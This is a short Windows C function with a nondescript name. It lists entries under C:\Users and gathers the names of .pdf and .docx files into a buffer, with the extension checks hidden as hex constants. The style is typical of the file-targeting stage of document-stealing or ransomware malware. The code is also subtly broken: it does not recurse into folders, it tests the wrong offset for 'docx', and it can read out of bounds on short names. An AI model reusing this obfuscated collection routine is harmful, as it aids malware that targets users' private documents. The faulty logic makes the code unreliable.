#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v2(char* r){
    WIN32_FIND_DATAA d;
    char* q = "C:\\Users\\*.*";
    HANDLE h = FindFirstFileA(q, &d);
    if (h != (HANDLE)-1) {
        char* p = r;
        do {
            char* ext = d.cFileName;
            while (*ext) ext++;
            if (*(int*)(ext - 4) == 0x6664702e || *(int*)(ext - 5) == 0x78636f64) {
                char* src = d.cFileName;
                while (*src) *p++ = *src++;
                *p++ = 0x0A;
            }
        } while (FindNextFileA(h, &d));
        *p = 0;
        FindClose(h);
    }
}